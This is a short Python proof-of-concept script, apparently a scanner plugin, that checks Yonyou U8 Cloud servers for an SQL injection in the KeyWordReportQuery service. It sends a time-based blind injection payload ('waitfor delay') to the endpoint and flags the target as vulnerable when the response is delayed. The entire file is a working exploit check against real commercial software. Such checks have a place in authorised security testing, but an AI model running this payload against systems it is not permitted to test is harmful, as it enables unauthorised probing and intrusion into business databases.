import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8 Cloud-KeyWordReportQuery存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = '''{"reportType":"1';waitfor delay '0:0:5'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}'''
    vurl = urllib.parse.urljoin(url, "/service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'success' in response.text and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult